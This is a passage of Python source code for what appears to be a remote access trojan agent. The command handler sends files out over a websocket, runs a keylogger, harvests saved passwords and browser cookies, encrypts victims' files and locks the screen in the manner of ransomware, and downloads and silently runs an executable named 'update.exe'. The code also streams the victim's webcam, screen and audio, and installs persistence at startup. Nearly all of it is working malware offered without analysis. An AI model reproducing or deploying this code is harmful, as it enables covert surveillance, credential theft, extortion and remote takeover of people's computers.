                                    os.startfile(a.get("path", "."))
                                elif cmd == CMD_FILE_DL:
                                    fp = a.get("path", "")

                                    def _read_b64(path):
                                        with open(path, "rb") as f:
                                            return base64.b64encode(f.read()).decode()

                                    try:
                                        b64 = await asyncio.to_thread(_read_b64, fp)
                                        await send_ws(
                                            json.dumps(
                                                {"cmd": CMD_FILE_DL, "data": {"name": os.path.basename(fp), "bytes": b64}}
                                            )
                                        )
                                    except Exception as ex:
                                        await send_ws(
                                            json.dumps(
                                                {
                                                    "cmd": CMD_SHELL,
                                                    "data": {"out": f"(error) Download read failed: {ex}\n", "shellId": "side"},
                                                }
                                            )
                                        )
                                elif cmd == CMD_KEYLOG:
                                    act = a.get("action", "")
                                    if act == "start":
                                        _keylog_on = True
                                    elif act == "stop":
                                        _keylog_on = False
                                    elif act == "fetch":
                                        await send_ws(json.dumps({"cmd": CMD_KEYLOG, "data": _keybuf}))
                                        _keybuf = ""
                                elif cmd == CMD_VAULT:
                                    data = await asyncio.to_thread(harvest_passwords)
                                    await send_ws(json.dumps({"cmd": CMD_VAULT, "data": data}))
                                elif cmd == CMD_COOKIES:
                                    data = await asyncio.to_thread(harvest_cookies)
                                    await send_ws(json.dumps({"cmd": CMD_COOKIES, "data": data}))
                                elif cmd == CMD_LOCK:
                                    threading.Thread(target=do_lock, args=(a.get("password", "admin"),), daemon=True).start()
                                elif cmd == 0x21:
                                    c = await asyncio.to_thread(
                                        do_encrypt, a.get("password", ""), a.get("targets", "")
                                    )
                                    await send_ws(
                                        json.dumps(
                                            {"cmd": CMD_SHELL, "data": {"out": f"Encrypted {c} files.", "shellId": "side"}}
                                        )
                                    )
                                elif cmd == 0x22:
                                    c = await asyncio.to_thread(
                                        do_decrypt, a.get("password", ""), a.get("targets", "")
                                    )
                                    await send_ws(
                                        json.dumps(
                                            {"cmd": CMD_SHELL, "data": {"out": f"Decrypted {c} files.", "shellId": "side"}}
                                        )
                                    )
                                elif cmd == CMD_URL:
                                    webbrowser.open(a.get("url", ""))
                                elif cmd == CMD_DL_EXE:

                                    def _dl_sync():
                                        import urllib.request
                                        dest = os.path.join(os.environ.get("TEMP", "."), "update.exe")
                                        urllib.request.urlretrieve(a.get("url", ""), dest)
                                        return dest

                                    try:
                                        dl_path = await asyncio.to_thread(_dl_sync)
                                        subprocess.Popen(dl_path, creationflags=0x08000000)
                                    except Exception as ex:
                                        _log(f"CMD_DL_EXE: {ex}")
                                elif cmd == CMD_PING:
                                    pass
                            except ConnectionClosed:
                                raise
                            except Exception as ex:
                                _log(f"CMD {hex(cmd) if cmd else '?'} err: {ex}")

                    async def camera_loop():
                        """Single capture + encode path: stable LED, lower lag, no dual OpenCV grab."""
                        target_dt = 1.0 / 28.0
                        idle_ticks = 0
                        while True:
                            t0 = time.perf_counter()
                            try:
                                if not _camera_needed():
                                    idle_ticks += 1
                                    if idle_ticks >= 6:
                                        async with _camera_lock:
                                            _close_camera()
                                        idle_ticks = 0
                                    await asyncio.sleep(0.08)
                                    continue
                                idle_ticks = 0
                                async with _camera_lock:
                                    cap = _open_camera()
                                    if cap is None:
                                        await asyncio.sleep(0.06)
                                        continue
                                    ret, frame = cap.read()
                                if not ret:
                                    await asyncio.sleep(0.02)
                                    continue
                                import cv2
                                _, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                                blob = b"\x01" + jpg.tobytes()
                                if _view_mode == "cam":
                                    await send_ws(blob)
                                if _cam_stream_enabled:
                                    await send_cam(blob)
                            except ConnectionClosed:
                                raise
                            except Exception as ex:
                                _log(f"camera_loop: {ex}")
                            elapsed = time.perf_counter() - t0
                            await asyncio.sleep(max(0.0, target_dt - elapsed))

                    async def stream_loop():
                        """Screen grab+encode runs in a worker thread so shell/recv are not blocked (log: H2 ruled out server; agent was CPU-bound here)."""
                        while True:
                            try:
                                if _view_mode == "screen":

                                    def _grab_screen_jpeg():
                                        with mss.mss() as sx:
                                            img = sx.grab(sx.monitors[0])
                                            buf = BytesIO()
                                            Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
                                                buf, format="JPEG", quality=48, optimize=True
                                            )
                                            return b"\x01" + buf.getvalue()

                                    await send_ws(await asyncio.to_thread(_grab_screen_jpeg))

                                if _audio_enabled:
                                    pkt = _audio_try_pop()
                                    if pkt:
                                        await send_ws(pkt)
                                        if _cam_stream_enabled:
                                            await send_cam(pkt)
                            except ConnectionClosed:
                                raise
                            except (BrokenPipeError, ConnectionResetError, OSError) as ex:
                                _log(f"Stream loop socket error: {ex}")
                                raise
                            except Exception as ex:
                                _log(f"Stream loop error: {ex}")
                            if _audio_enabled:
                                await asyncio.sleep(0.014)
                            else:
                                await asyncio.sleep(0.042 if _view_mode == "screen" else 0.02)

                    recv_t = asyncio.create_task(recv_loop())
                    stream_t = asyncio.create_task(stream_loop())
                    cam_t = asyncio.create_task(camera_loop())
                    ping_t = asyncio.create_task(agent_keepalive())
                    tasks = {recv_t, stream_t, cam_t, ping_t}
                    try:
                        done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                        exc_to_raise = None
                        for t in done:
                            if not t.cancelled():
                                ex = t.exception()
                                if ex is not None:
                                    exc_to_raise = ex
                        for p in pending:
                            p.cancel()
                        if pending:
                            await asyncio.gather(*pending, return_exceptions=True)
                        if exc_to_raise is not None:
                            raise exc_to_raise
                    finally:
                        for t in tasks:
                            if not t.done():
                                t.cancel()
                        await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            raise
        except ExceptionGroup as eg:
            for sub in eg.exceptions:
                _log(f"Connection error: {sub}")
        except Exception as ex:
            _log(f"Connection error: {ex}")

        delay = min(3 * (2 ** min(retry_count, 5)), 60)
        _log(f"Retrying in {delay} seconds...")
        await asyncio.sleep(delay)
        retry_count += 1
if __name__ == "__main__":
    install_persistence()
    check_lock_state()
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)
    _loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
    try:
        _loop.run_until_complete(main())
    finally:
        try:
            _loop.run_until_complete(_loop.shutdown_asyncgens())
        except Exception:
            pass
        _loop.close()
